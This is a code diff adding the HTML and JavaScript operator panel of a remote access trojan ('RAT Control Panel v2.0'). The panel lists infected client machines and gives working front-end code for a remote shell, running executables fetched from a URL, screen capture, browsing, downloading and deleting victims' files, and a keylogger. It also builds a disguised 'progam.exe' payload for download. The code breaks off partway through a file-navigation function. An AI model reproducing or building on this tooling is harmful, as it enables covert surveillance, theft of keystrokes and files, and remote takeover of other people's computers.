@@ -1,0 +1,1201 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control Panel v2.0</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* =====================================================
+           THEME VARIABLES
+        ===================================================== */
+        :root {
+            --bg-main: #09090b;
+            --bg-panel: #18181b;
+            --bg-card: #27272a;
+            --bg-hover: #3f3f46;
+            --bg-input: #09090b;
+
+            --border-soft: #27272a;
+            --border-active: #52525b;
+
+            --text-main: #ededed;
+            --text-muted: #a1a1aa;
+            --text-dim: #71717a;
+
+            --accent: #fafafa;
+            --accent-hover: #e4e4e7;
+            --accent-glow: rgba(255, 255, 255, 0.1);
+
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --info: #3b82f6;
+
+            --radius-sm: 6px;
+            --radius-md: 8px;
+            --radius-lg: 12px;
+
+            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+        }
+
+        /* =====================================================
+           RESET & BASE
+        ===================================================== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        body {
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            font-family: 'Inter', system-ui, sans-serif;
+            font-size: 14px;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* =====================================================
+           LAYOUT
+        ===================================================== */
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* =====================================================
+           HEADER
+        ===================================================== */
+        header {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-soft);
+            border-radius: var(--radius-lg);
+            padding: 20px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: var(--shadow-md);
+        }
+
+        h1 {
+            font-size: 18px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        h1 span {
+            color: var(--accent);
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        /* =====================================================
+           STATS CARDS
+        ===================================================== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+        }
+
+        .stat-card {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-soft);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            transition: transform 0.2s, var(--border-active) 0.2s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+            border-color: var(--border-active);
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-main);
+        }
+
+        .stat-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* =====================================================
+           MAIN CONTENT GRID
+        ===================================================== */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 350px 1fr;
+            gap: 20px;
+            flex: 1;
+            min-height: 600px;
+        }
+
+        @media (max-width: 1024px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* =====================================================
+           PANELS
+        ===================================================== */
+        .panel {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-soft);
+            border-radius: var(--radius-lg);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .panel-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border-soft);
+            background: rgba(255, 255, 255, 0.02);
+            font-weight: 600;
+            font-size: 13px;
+            color: var(--text-main);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* =====================================================
+           PC LIST
+        ===================================================== */
+        .pc-list {
+            overflow-y: auto;
+            flex: 1;
+            padding: 12px;
+            max-height: 80vh;
+        }
+
+        .pc-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--bg-card);
+            border: 1px solid var(--border-soft);
+            margin-bottom: 8px;
+            padding: 12px 14px;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .pc-item:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent);
+        }
+
+        .pc-item.active {
+            background: rgba(59, 130, 246, 0.08);
+            border-color: var(--accent);
+            box-shadow: 0 0 15px var(--accent-glow);
+        }
+
+        .pc-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .pc-name {
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 2px;
+        }
+
+        .pc-meta {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .status-badge {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            box-shadow: 0 0 8px currentColor;
+        }
+
+        .status-online {
+            color: var(--success);
+            background: currentColor;
+        }
+
+        .status-offline {
+            color: var(--text-muted);
+            background: currentColor;
+            box-shadow: none;
+        }
+
+        /* =====================================================
+           CONTROL AREA
+        ===================================================== */
+        .control-area {
+            padding: 24px;
+            overflow-y: auto;
+            max-height: 85vh;
+        }
+
+        .empty-state {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: var(--text-dim);
+            gap: 16px;
+        }
+
+        .empty-icon {
+            font-size: 48px;
+            opacity: 0.5;
+        }
+
+        .control-group {
+            background: var(--bg-card);
+            border: 1px solid var(--border-soft);
+            border-radius: var(--radius-md);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .control-group h3 {
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-muted);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .control-group h3 svg {
+            width: 16px;
+            height: 16px;
+            opacity: 0.8;
+        }
+
+        /* =====================================================
+           FORMS & INPUTS
+        ===================================================== */
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        input[type="text"] {
+            flex: 1;
+            background: var(--bg-input);
+            border: 1px solid var(--border-soft);
+            padding: 10px 14px;
+            border-radius: var(--radius-sm);
+            color: var(--text-main);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            transition: border 0.2s;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--accent);
+        }
+
+        /* =====================================================
+           BUTTONS
+        ===================================================== */
+        .btn {
+            padding: 10px 18px;
+            border-radius: var(--radius-sm);
+            border: none;
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            justify-content: center;
+        }
+
+        .btn-primary {
+            background: var(--accent);
+            color: var(--bg-main);
+        }
+
+        .btn-primary:hover {
+            background: var(--accent-hover);
+            box-shadow: 0 4px 12px var(--accent-glow);
+        }
+
+        .btn-secondary {
+            background: var(--bg-hover);
+            color: var(--text-main);
+            border: 1px solid var(--border-soft);
+        }
+
+        .btn-secondary:hover {
+            border-color: var(--text-muted);
+        }
+
+        .btn-danger {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--danger);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .btn-danger:hover {
+            background: rgba(239, 68, 68, 0.2);
+            border-color: var(--danger);
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        /* =====================================================
+           OUTPUT & TERMINAL
+        ===================================================== */
+        .console-output {
+            background: #0d0f14;
+            border: 1px solid #2d3748;
+            border-radius: var(--radius-sm);
+            padding: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: #a0aec0;
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+
+        .console-output.success {
+            border-color: rgba(34, 197, 94, 0.3);
+            color: #4ade80;
+        }
+
+        .console-output.error {
+            border-color: rgba(239, 68, 68, 0.3);
+            color: #f87171;
+        }
+
+        /* =====================================================
+           FILE TABLE
+        ===================================================== */
+        .file-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        .file-table th {
+            text-align: left;
+            padding: 8px 12px;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border-soft);
+            font-weight: 500;
+        }
+
+        .file-table td {
+            padding: 10px 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            color: var(--text-main);
+        }
+
+        .file-table tr:hover td {
+            background: var(--bg-hover);
+        }
+
+        .type-dir {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        .type-file {
+            color: var(--text-main);
+        }
+
+        .action-link {
+            color: var(--accent);
+            cursor: pointer;
+            margin-right: 10px;
+            text-decoration: none;
+        }
+
+        .action-link:hover {
+            text-decoration: underline;
+        }
+
+        .action-link.delete {
+            color: var(--danger);
+        }
+
+        /* =====================================================
+           NOTIFICATIONS
+        ===================================================== */
+        .toast-container {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .toast {
+            background: var(--bg-card);
+            border-left: 4px solid var(--accent);
+            color: var(--text-main);
+            padding: 16px 20px;
+            border-radius: 4px;
+            box-shadow: var(--shadow-lg);
+            animation: slideIn 0.3s ease;
+            min-width: 300px;
+            font-size: 13px;
+        }
+
+        .toast.success {
+            border-color: var(--success);
+        }
+
+        .toast.error {
+            border-color: var(--danger);
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+
+            to {
+                transform: 0;
+                opacity: 1;
+            }
+        }
+
+        /* =====================================================
+           SCROLLBAR
+        ===================================================== */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #374151;
+            border-radius: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #4b5563;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="toast-container" id="toastContainer"></div>
+
+    <div class="container">
+        <!-- HEADER -->
+        <header>
+            <h1>
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
+                </svg>
+                UKR <span>PANEL</span>
+            </h1>
+            <div class="header-actions">
+                <button class="btn btn-secondary" onclick="window.location.href='/logout'">LOGOUT</button>
+            </div>
+        </header>
+
+        <!-- STATS -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-value" id="onlinePCs">0</div>
+                <div class="stat-label">Online Clients</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalPCs">0</div>
+                <div class="stat-label">Total Registered</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="cpuUsage">0%</div>
+                <div class="stat-label">Server CPU</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="ramUsage">0%</div>
+                <div class="stat-label">Server RAM</div>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div class="main-grid">
+
+            <!-- SIDEBAR: CLIENT LIST -->
+            <div class="panel">
+                <div class="panel-header">
+                    <span>CONNECTED CLIENTS</span>
+                    <button class="btn btn-secondary" style="padding: 4px 8px; font-size: 11px;"
+                        onclick="refreshPCs()">REFRESH</button>
+                </div>
+                <div class="pc-list" id="pcList">
+                    <div style="padding: 20px; text-align: center; color: var(--text-dim);">Loading...</div>
+                </div>
+
+                <div style="padding: 16px; border-top: 1px solid var(--border-soft);">
+                    <button id="buildBtn" class="btn btn-primary" style="width: 100%;" onclick="buildRAT()">
+                        <span>BUILD PROGAM.EXE</span>
+                    </button>
+                    <div id="buildOutput"
+                        style="font-size: 11px; margin-top: 8px; text-align: center; color: var(--text-dim);"></div>
+                </div>
+            </div>
+
+            <!-- MAIN CONTROL AREA -->
+            <div class="panel">
+                <div class="panel-header">
+                    <span id="controlTitle">CONTROLS</span>
+                    <span id="selectedStatus"></span>
+                </div>
+
+                <div class="control-area">
+
+                    <!-- EMPTY STATE -->
+                    <div id="noPC" class="empty-state">
+                        <div class="empty-icon">💻</div>
+                        <h3>No Client Selected</h3>
+                        <p>Select a connected computer from the list to view options.</p>
+                    </div>
+
+                    <!-- CONTROLS CONTAINER -->
+                    <div id="controls" class="hidden">
+
+                        <!-- TERMINAL -->
+                        <div class="control-group">
+                            <h3>
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <polyline points="4 17 10 11 4 5"></polyline>
+                                    <line x1="12" y1="19" x2="20" y2="19"></line>
+                                </svg>
+                                Remote Terminal
+                                <button class="btn btn-secondary" style="margin-left: auto; padding: 4px 8px; font-size: 11px;" onclick="document.getElementById('terminalOutput').textContent = ''">CLEAR</button>
+                            </h3>
+                            <div class="console-output" id="terminalOutput" style="height: 300px;"></div>
+                            <div class="input-group" style="margin-top: 10px;">
+                                <input type="text" id="terminalInput"
+                                    placeholder="Type command (e.g., ipconfig, dir)..."
+                                    onkeypress="if(event.key==='Enter') sendTerminalCommand()">
+                                <button class="btn btn-primary" onclick="sendTerminalCommand()">SEND</button>
+                            </div>
+                        </div>
+
+                        <!-- EXECUTE URL -->
+                        <div class="control-group">
+                            <h3>
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                                </svg>
+                                Execute URL
+                            </h3>
+                            <div class="input-group">
+                                <input type="text" id="executeUrl" placeholder="URL to executable (e.g. http://site.com/malware.exe)">
+                                <button class="btn btn-primary" onclick="executeUrl()">EXECUTE</button>
+                            </div>
+                        </div>
+
+                        <!-- SCREENSHOT -->
+                        <div class="control-group">
+                            <h3>
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                                    <circle cx="8.5" cy="8.5" r="1.5"></circle>
+                                    <polyline points="21 15 16 10 5 21"></polyline>
+                                </svg>
+                                Live Screenshot
+                            </h3>
+                            <button class="btn btn-secondary" onclick="requestScreenshot()"
+                                style="width: 100%; margin-bottom: 10px;">CAPTURE SCREENSHOT</button>
+                            <div id="screenshotContainer"
+                                style="background: black; padding: 10px; border-radius: var(--radius-sm); text-align: center; min-height: 100px; display: flex; align-items: center; justify-content: center;">
+                                <span style="color: #4b5563;">No screenshot captured</span>
+                            </div>
+                        </div>
+
+                        <!-- FILE MANAGER -->
+                        <div class="control-group">
+                            <h3>
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path>
+                                    <polyline points="13 2 13 9 20 9"></polyline>
+                                </svg>
+                                File Manager
+                            </h3>
+                            <div class="input-group">
+                                <input type="text" id="filePath" placeholder="Path (e.g. C:\Users)">
+                                <button class="btn btn-secondary" onclick="fileList()">LIST</button>
+                            </div>
+                            <div class="console-output" id="fileManagerDisplay"
+                                style="max-height: 300px; overflow-y: auto; padding: 0;">
+                                <!-- Table rendered via JS -->
+                            </div>
+                        </div>
+
+                        <!-- KEYLOGGER -->
+                        <div class="control-group">
+                            <h3>
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="2" y="4" width="20" height="16" rx="2"></rect>
+                                    <path
+                                        d="M6 8h.001M10 8h.001M14 8h.001M18 8h.001M6 12h.001M10 12h.001M14 12h.001M18 12h.001M6 16h.001M10 16h.001M14 16h.001M18 16h.001">
+                                    </path>
+                                </svg>
+                                Keylogger
+                            </h3>
+                            <div class="btn-group" style="margin-bottom: 10px;">
+                                <button class="btn btn-primary" onclick="keyloggerStart()">START</button>
+                                <button class="btn btn-secondary" onclick="keyloggerStop()">STOP</button>
+                                <button class="btn btn-secondary" onclick="keyloggerLogs()">FETCH LOGS</button>
+                            </div>
+                            <div class="console-output" id="keyloggerOutput"></div>
+                        </div>
+
+                        <!-- SYSTEM POWER -->
+                        <div class="control-group">
+                            <h3>
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M18.36 6.64a9 9 0 1 1-12.73 0"></path>
+                                    <line x1="12" y1="2" x2="12" y2="12"></line>
+                                </svg>
+                                System Power
+                            </h3>
+                            <div class="btn-group">
+                                <button class="btn btn-danger" onclick="sysShutdown()">SHUTDOWN</button>
+                                <button class="btn btn-secondary" onclick="sysRestart()">RESTART</button>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===================================
+        // STATE & INIT
+        // ===================================
+        let selectedPC = null;
+        let socket = null;
+        const API_BASE = '';
+
+        async function api(url, method = 'GET', body = null) {
+            const options = { method, headers: {} };
+            if (body) {
+                options.headers['Content-Type'] = 'application/json';
+                options.body = JSON.stringify(body);
+            }
+            try {
+                const resp = await fetch(API_BASE + url, options);
+                if (!resp.ok) throw new Error('HTTP ' + resp.status);
+                return await resp.json();
+            } catch (e) {
+                console.error('API error:', url, e);
+                return null;
+            }
+        }
+
+        async function refreshPCs() {
+            try {
+                const data = await api('/api/pcs');
+                const pcList = document.getElementById('pcList');
+                if (!data || !data.pcs) {
+                    pcList.innerHTML = '<div style="padding:20px;text-align:center;color:#71717a;">No data</div>';
+                    document.getElementById('onlinePCs').textContent = '0';
+                    document.getElementById('totalPCs').textContent = '0';
+                    return;
+                }
+                const onlineCount = data.pcs.filter(p => p.status === 'ONLINE').length;
+                document.getElementById('totalPCs').textContent = data.count || 0;
+                document.getElementById('onlinePCs').textContent = onlineCount;
+                if (data.pcs.length === 0) {
+                    pcList.innerHTML = '<div style="padding:20px;text-align:center;color:#71717a;">No PCs registered</div>';
+                } else {
+                    pcList.innerHTML = data.pcs.map(pc => {
+                        const isOnline = pc.status === 'ONLINE';
+                        const isActive = selectedPC === pc.name;
+                        const safeName = pc.name.replace(/'/g, "\\'");
+                        return '<div class="pc-item' + (isActive ? ' active' : '') + '" onclick="selectPC(\'' + safeName + '\')">' +
+                            '<div class="pc-info">' +
+                            '<div class="pc-name">' + pc.name + '</div>' +
+                            '<div class="pc-meta">' + pc.status + ' | ' + (pc.registered_at || '') + '</div>' +
+                            '</div>' +
+                            '<span class="status-badge ' + (isOnline ? 'status-online' : 'status-offline') + '"></span>' +
+                            '</div>';
+                    }).join('');
+                }
+            } catch (e) {
+                console.error('refreshPCs error:', e);
+            }
+        }
+
+        async function updateServerStats() {
+            try {
+                const data = await api('/api/metrics');
+                if (data) {
+                    document.getElementById('cpuUsage').textContent = Math.round(data.cpu_percent || 0) + '%';
+                    document.getElementById('ramUsage').textContent = Math.round(data.ram_percent || 0) + '%';
+                }
+            } catch (e) {
+                console.error('updateServerStats error:', e);
+            }
+        }
+
+        function selectPC(pcName) {
+            selectedPC = pcName;
+            document.getElementById('controlTitle').textContent = 'CONTROLS: ' + pcName;
+            document.getElementById('noPC').classList.add('hidden');
+            document.getElementById('controls').classList.remove('hidden');
+            document.getElementById('selectedStatus').textContent = '';
+            if (socket && socket.connected) {
+                socket.emit('terminal_connect', { pc_name: pcName });
+            }
+            document.getElementById('terminalOutput').textContent = '';
+            document.getElementById('keyloggerOutput').textContent = '';
+            document.getElementById('screenshotContainer').innerHTML = '<span style="color: #4b5563;">Loading screenshot...</span>';
+            refreshScreenshot(pcName);
+            refreshPCs();
+        }
+
+        window.onload = function () {
+            initWebSocket();
+            refreshPCs();
+            setInterval(refreshPCs, 5000);
+            setInterval(updateServerStats, 5000);
+            updateServerStats();
+        };
+
+        // ===================================
+        // WEBSOCKET
+        // ===================================
+        function initWebSocket() {
+            socket = io();
+
+            socket.on('connect', () => {
+                showToast('success', 'Connected to WebSocket server');
+                if (selectedPC) {
+                    // Re-join room if reconnected
+                    socket.emit('terminal_connect', { pc_name: selectedPC });
+                }
+            });
+
+            socket.on('disconnect', () => {
+                showToast('error', 'Disconnected from server');
+            });
+
+            socket.on('terminal_command', (data) => {
+                // Not really used client-side for receiving commands, but good for debug
+            });
+
+            socket.on('notification', (data) => {
+                if (!data.pc_name || data.pc_name === selectedPC) {
+                    showToast(data.type, data.message);
+                }
+                refreshPCs();
+            });
+
+            socket.on('pc_update', (data) => {
+                refreshPCs();
+            });
+
+            socket.on('command_sent', (data) => {
+                appendToTerminal('> ' + data.command, 'command');
+            });
+
+            // Listen for command results from backend
+            socket.on('command_result', (data) => {
+                if (data.pc_name !== selectedPC) return; // Only show for selected PC
+                processCommandResult(data.result);
+            });
+        }
+
+        function processCommandResult(res) {
+            // Try to detect File Manager response (JSON object)
+            // The client returns string representation of dict if python, or json.
+            if (typeof res === 'string') {
+                // Check for Python dict string or JSON
+                if (res.trim().startsWith("{") && (res.includes("'path':") || res.includes('"path":'))) {
+                    try {
+                        // Attempt to parse as JSON first
+                        let fileData;
+                        try {
+                            fileData = JSON.parse(res);
+                        } catch (e) {
+                            // If failed, try to fix Python string representation
+                            // This is risky but necessary if the RAT sends str(dict)
+                            const jsonStr = res.replace(/'/g, '"').replace(/False/g, 'false').replace(/True/g, 'true').replace(/None/g, 'null');
+                            fileData = JSON.parse(jsonStr);
+                        }
+
+                        if (fileData && fileData.items) {
+                            renderFileTable(fileData.items, fileData.path);
+                            return; // Don't show in terminal
+                        }
+                    } catch (e) {
+                        // Not valid JSON/Dict, fall through to terminal
+                    }
+                }
+
+                // Keylogger Logs
+                if (res.startsWith('Keylogger started') || res.startsWith('Keylogger stopped')) {
+                    appendToTerminal(`> ${res}`, 'success');
+                    return;
+                }
+                
+                // Keylogger Data
+                if (res.includes('[Keylogger]')) {
+                     const keylogOut = document.getElementById('keyloggerOutput');
+                     keylogOut.textContent += res + "\n";
+                     keylogOut.scrollTop = keylogOut.scrollHeight;
+                     return;
+                }
+            }
+
+            // Generic Output
+            appendToTerminal(res, 'output');
+        }
+
+        async function fetchResultHistory(pcName) {
+            const data = await api(`/api/results/${pcName}`);
+            if (data && data.results) {
+                // Process results (oldest to newest for terminal)
+                const reversed = [...data.results].reverse();
+                reversed.forEach(item => {
+                    processCommandResult(item.content + " (History)");
+                });
+            }
+        }
+
+        // ===================================
+        // ACTIONS
+        // ===================================
+
+        // --- TERMINAL ---
+        async function sendTerminalCommand() {
+            if (!selectedPC) return;
+            const input = document.getElementById('terminalInput');
+            const cmd = input.value.trim();
+            if (!cmd) return;
+
+            // Attempt WS first
+            if (socket && socket.connected) {
+                socket.emit('terminal_command', { pc_name: selectedPC, command: cmd });
+                // Append locally for immediate feedback
+                appendToTerminal(`$ ${cmd}`, 'command');
+            } else {
+                // Fallback API
+                await api('/api/command', 'POST', { pc_name: selectedPC, command: cmd });
+                appendToTerminal(`$ ${cmd} (via API)`, 'command');
+            }
+
+            input.value = '';
+        }
+
+        function appendToTerminal(text, type = 'normal') {
+            const term = document.getElementById('terminalOutput');
+            const date = new Date().toLocaleTimeString();
+            term.textContent += `[${date}] ${text}\n`;
+            term.scrollTop = term.scrollHeight;
+        }
+
+        // --- KEYLOGGER ---
+        async function keyloggerStart() {
+            if (!selectedPC) return;
+            await api(`/api/keylogger/start/${selectedPC}`, 'POST', {});
+            showToast('info', 'Keylogger start command queued');
+        }
+        async function keyloggerStop() {
+            if (!selectedPC) return;
+            await api(`/api/keylogger/stop/${selectedPC}`, 'POST', {});
+            showToast('info', 'Keylogger stop command queued');
+        }
+        async function keyloggerLogs() {
+            if (!selectedPC) return;
+            await api(`/api/keylogger/logs/${selectedPC}`, 'POST', {});
+            showToast('info', 'Fetching logs...');
+        }
+
+        // --- SCREENSHOT ---
+        async function refreshScreenshot(pcName) {
+            try {
+                // Add timestamp to bypass cache
+                const res = await api(`/api/screenshot_data/${pcName}?t=${Date.now()}`);
+                const container = document.getElementById('screenshotContainer');
+
+                if (res && res.image) {
+                    container.innerHTML = `
+                        <div style="display:flex; flex-direction:column; gap:8px; width:100%;">
+                            <img src="data:image/png;base64,${res.image}" style="max-width:100%; border-radius:4px; border:1px solid #374151;">
+                            <div style="font-size:11px; color:#9ca3af;">Last captured: ${res.timestamp || 'Just now'}</div>
+                        </div>
+                    `;
+                } else {
+                    container.innerHTML = '<span style="color: #4b5563;">No screenshot available</span>';
+                }
+            } catch (e) {
+                console.error("Screenshot refresh error:", e);
+            }
+        }
+
+        async function requestScreenshot() {
+            if (!selectedPC) return;
+            // Find button by text or class if event not available, or just use hardcoded ID if I added one.
+            // But usually this calls from button click.
+
+            await api('/api/command', 'POST', {
+                pc_name: selectedPC,
+                command: '!screenshot'
+            });
+
+            showToast('info', 'Screenshot requested. Wait a few seconds...');
+
+            // Poll for update a few times
+            let checks = 0;
+            const interval = setInterval(async () => {
+                checks++;
+                refreshScreenshot(selectedPC);
+                if (checks > 5) clearInterval(interval);
+            }, 3000);
+        }
+
+
+        // --- SYSTEM ---
+        async function sysShutdown() {
+            if (!selectedPC || !confirm('Are you sure?')) return;
+            await api('/api/command', 'POST', { pc_name: selectedPC, command: '!shutdown' });
+            showToast('warning', 'Shutdown command sent');
+        }
+        async function sysRestart() {
+            if (!selectedPC || !confirm('Are you sure?')) return;
+            await api('/api/command', 'POST', { pc_name: selectedPC, command: '!restart' });
+            showToast('warning', 'Restart command sent');
+        }
+
+        // --- BUILD ---
+        async function buildRAT() {
+            const btn = document.getElementById('buildBtn');
+            const out = document.getElementById('buildOutput');
+
+            btn.disabled = true;
+            btn.innerHTML = 'BUILDING...';
+            out.textContent = 'Please wait, compiling exe...';
+
+            try {
+                const res = await fetch('/api/build', { method: 'POST' });
+                if (!res.ok) throw new Error('Build failed');
+
+                const blob = await res.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'progam.exe'; // Filename
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+
+                out.textContent = 'Download started!';
+                out.style.color = 'var(--success)';
+            } catch (e) {
+                out.textContent = 'Error: ' + e.message;
+                out.style.color = 'var(--danger)';
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = 'BUILD PROGAM.EXE';
+            }
+        }
+
+        // ===================================
+        // UTILS
+        // ===================================
+        function showToast(type, msg) {
+            const cont = document.getElementById('toastContainer');
+            const el = document.createElement('div');
+            el.className = `toast ${type}`;
+            el.textContent = msg;
+            cont.appendChild(el);
+            setTimeout(() => {
+                el.style.opacity = '0';
+                setTimeout(() => el.remove(), 300);
+            }, 4000);
+        }
+
+        function renderFileTable(items, currentPath) {
+            const display = document.getElementById('fileManagerDisplay');
+            document.getElementById('filePath').value = currentPath;
+
+            if (!items || items.length === 0) {
+                display.innerHTML = '<div style="padding:10px;">Empty directory</div>';
+                return;
+            }
+
+            let html = '<table class="file-table"><thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr></thead><tbody>';
+
+            // Add ".." for parent directory
+            html += `
+                <tr>
+                    <td class="type-dir" style="cursor:pointer;" onclick="navigateUp('${currentPath.replace(/\\/g, '\\\\')}')">..</td>
+                    <td>DIR</td>
+                    <td>-</td>
+                    <td></td>
+                </tr>
+            `;
+
+            items.forEach(item => {
+                const isDir = item.type === 'dir';
+                const typeClass = isDir ? 'type-dir' : 'type-file';
+                const icon = isDir ? '📁' : '📄';
+                const size = item.size ? formatBytes(item.size) : '-';
+                
+                // Escape backslashes for JS string
+                const fullPath = (currentPath.endsWith('\\') ? currentPath : currentPath + '\\') + item.name;
+                const escapedPath = fullPath.replace(/\\/g, '\\\\');
+
+                html += `
+                <tr>
+                    <td class="${typeClass}" style="cursor:pointer;" onclick="${isDir ? `fileList('${escapedPath}')` : ''}">
+                        ${icon} ${item.name}
+                    </td>
+                    <td>${isDir ? 'DIR' : 'FILE'}</td>
+                    <td>${size}</td>
+                    <td>
+                        ${!isDir ? `<span class="action-link" onclick="downloadFile('${escapedPath}')">Download</span>` : ''}
+                        <span class="action-link delete" onclick="deleteFile('${escapedPath}')">Delete</span>
+                    </td>
+                </tr>
+                `;
+            });
+
+            html += '</tbody></table>';
+            display.innerHTML = html;
+        }
+
+        function formatBytes(bytes, decimals = 2) {
+            if (!+bytes) return '0 Bytes';
+            const k = 1024;
+            const dm = decimals < 0 ? 0 : decimals;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
+        }
+
+        function navigateUp(path) {
+            // Simple parent directory logic
+            const parts = path.split('\\');
+            if (parts.length > 1) {
+                parts.pop(); // Remove last segment
+                // If it was a drive root like C:\, pop might leave empty or C:
+                // Handle drive root
+                if (parts.length === 1 && parts[0].endsWith(':')) {
+                     fileList(parts[0] + '\\');
+                } else {
